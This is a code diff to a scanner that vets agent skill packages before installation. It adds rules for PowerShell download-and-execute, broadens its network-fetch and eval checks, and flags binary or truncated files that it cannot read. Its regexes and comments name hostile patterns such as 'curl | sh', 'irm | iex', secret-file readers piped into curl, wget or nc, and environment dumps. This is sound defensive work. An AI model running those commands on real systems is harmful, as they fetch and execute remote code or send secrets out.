@@ -34,13 +34,20 @@ export interface SkillScanResult {
 export interface ScannableFile {
   /** Relative path within the skill dir. */
   path: string;
+  /** Decoded text. Ignored (beyond the shebang check) for `binary`. */
   content: string;
   /**
    * True when `content` is only part of the file (head + tail of a file
-   * over the full-scan cap). The scanner then adds a `caution` finding,
-   * because the unread middle could hide anything.
+   * over the full-scan cap). The unread middle could hide anything, so
+   * the scanner adds an `oversized-file` finding (see {@link unreadSeverity}).
    */
   truncated?: boolean;
+  /**
+   * True when the bytes are not text in any encoding the collector knows
+   * (NUL bytes, no UTF-16 BOM or pattern). Rules cannot read it, so the
+   * scanner adds an `unscanned-binary` finding.
+   */
+  binary?: boolean;
 }
 
 interface ScanRule {
@@ -60,18 +67,27 @@ const SECRET_FILE =
 const SECRET_READER = /\b(cat|base64|tar|zip|gzip|xxd)\b/i;
 const ENV_DUMP = /\b(env|printenv)\s*$/i;
 const NETWORK_TOOL_HEAD = /^\s*(sudo\s+)?(curl|wget|nc|ncat|socat)\b/i;
+/** PowerShell downloaders, full names and the default aliases. */
+const PS_FETCH =
+  /\b(iwr|irm|Invoke-WebRequest|Invoke-RestMethod|curl|wget|Net\.WebClient|DownloadString)\b/i;
+const PS_EXEC_HEAD = /^\s*(iex|Invoke-Expression)\b/i;
 
 /**
- * True when an earlier stage of a shell pipeline matches `source` and a
- * later stage starts with a network tool. Split on `|` instead of one
- * regex: linear time on any input (`||` just yields an empty stage).
+ * True when an earlier stage of a pipeline matches `source` and a later
+ * stage starts with `sinkHead` (a network tool by default). Split on `|`
+ * instead of one regex: linear time on any input (`||` just yields an
+ * empty stage).
  */
-function pipesInto(line: string, source: (stage: string) => boolean): boolean {
+function pipesInto(
+  line: string,
+  source: (stage: string) => boolean,
+  sinkHead: RegExp = NETWORK_TOOL_HEAD,
+): boolean {
   if (!line.includes("|")) return false;
   const stages = line.split("|");
   let sourceSeen = false;
   for (const stage of stages) {
-    if (sourceSeen && NETWORK_TOOL_HEAD.test(stage)) return true;
+    if (sourceSeen && sinkHead.test(stage)) return true;
     if (!sourceSeen && source(stage)) sourceSeen = true;
   }
   return false;
@@ -88,6 +104,20 @@ const RULES: readonly ScanRule[] = [
     rule: "remote-exec",
     severity: "dangerous",
     pattern: /\b(curl|wget)\b[^\n|]*\|\s*(sudo\s+)?(ba)?sh\b/i,
+  },
+  {
+    // PowerShell download-and-run: `irm https://x/a.ps1 | iex`.
+    rule: "remote-exec",
+    severity: "dangerous",
+    pattern: (line) =>
+      pipesInto(line, (stage) => PS_FETCH.test(stage), PS_EXEC_HEAD),
+  },
+  {
+    // `iex (irm https://x)`, `iex ((New-Object Net.WebClient).DownloadString(...))`.
+    rule: "remote-exec",
+    severity: "dangerous",
+    pattern:
+      /\b(iex|Invoke-Expression)\s*[(\s]\s*[($]?\s*\(?\s*(iwr|irm|Invoke-WebRequest|Invoke-RestMethod|New-Object\s+(System\.)?Net\.WebClient)\b/i,
   },
   {
     rule: "decode-exec",
@@ -161,9 +191,15 @@ const RULES: readonly ScanRule[] = [
   {
     rule: "network-fetch",
     severity: "caution",
-    pattern: /\b(curl|wget|Invoke-WebRequest)\b/i,
+    pattern:
+      /\b(curl|wget|Invoke-WebRequest|Invoke-RestMethod|iwr|irm|Net\.WebClient)\b/i,
   },
-  { rule: "eval", severity: "caution", pattern: /\b(eval|exec)\s*\(/ },
+  {
+    rule: "eval",
+    severity: "caution",
+    pattern:
+      /\b(eval|exec)\s*\(|\b([Ii][Ee][Xx]|[Ii]nvoke-[Ee]xpression)\b/,
+  },
   {
     rule: "prompt-injection",
     severity: "caution",
@@ -190,14 +226,7 @@ const EXCERPT_MAX = 160;
 const MAX_LINE_CHARS = 8 * 1024;
 const LINE_WINDOW_OVERLAP = 1024;
 
-/**
- * Text files the agent may read and follow besides SKILL.md
- * (`references/*.md`, notes). A prompt injection or a `curl | sh` hidden
- * in one of them is as live as one in SKILL.md.
- */
-const TEXT_EXTENSIONS = [".md", ".markdown", ".txt"];
-
-/** File extensions worth scanning beyond SKILL.md (scripts). */
+/** Extensions of files an interpreter runs (see skill-script-runner). */
 const SCRIPT_EXTENSIONS = [
   ".sh",
   ".bash",
@@ -208,34 +237,64 @@ const SCRIPT_EXTENSIONS = [
   ".cjs",
   ".ts",
   ".ps1",
+  ".psm1",
+  ".bat",
+  ".cmd",
   ".rb",
+  ".pl",
 ];
 
 /** Directories whose files are executables whatever their extension. */
 const SCRIPT_DIRS = ["scripts/", "bin/"];
 
-export function isScannable(path: string): boolean {
-  if (path === "SKILL.md" || path.endsWith("/SKILL.md")) return true;
+/**
+ * Whether a file is something that runs: under `scripts/` or `bin/`, a
+ * script extension, or (when `content` is given) a `#!` shebang. Content
+ * we could not read in such a file is `dangerous`, not `caution`.
+ */
+export function isExecutableFile(path: string, content?: string): boolean {
   const lower = path.toLowerCase();
   const inScriptDir = SCRIPT_DIRS.some(
     (dir) => lower.startsWith(dir) || lower.includes(`/${dir}`),
   );
   if (inScriptDir) return true;
-  return (
-    SCRIPT_EXTENSIONS.some((ext) => lower.endsWith(ext)) ||
-    TEXT_EXTENSIONS.some((ext) => lower.endsWith(ext))
-  );
+  if (SCRIPT_EXTENSIONS.some((ext) => lower.endsWith(ext))) return true;
+  return content !== undefined && content.startsWith("#!");
+}
+
+/**
+ * Severity for content the rules never saw (unread middle, binary).
+ * Lane decision: unread bytes in something that runs could be the
+ * payload itself, so they need `--acknowledge-risk`; unread docs or data
+ * only need a confirmation.
+ */
+export function unreadSeverity(
+  path: string,
+  content?: string,
+): SkillScanSeverity {
+  return isExecutableFile(path, content) ? "dangerous" : "caution";
 }
 
 export function scanSkillFiles(
   files: readonly ScannableFile[],
 ): SkillScanResult {
   const findings: SkillScanFinding[] = [];
+  // Every file is scanned, whatever its name: a script can source or
+  // exec any other file in the skill (`. ../lib/env.conf`).
   for (const file of files) {
-    if (!isScannable(file.path)) continue;
+    if (file.binary) {
+      findings.push({
+        severity: unreadSeverity(file.path, file.content),
+        rule: "unscanned-binary",
+        file: file.path,
+        line: 0,
+        excerpt: "binary file: its contents could not be scanned",
+      });
+      continue;
+    }
     if (file.truncated) {
       findings.push({
-        severity: "caution",
+        severity: unreadSeverity(file.path, file.content),
         rule: "oversized-file",
         file: file.path,
         line: 0,
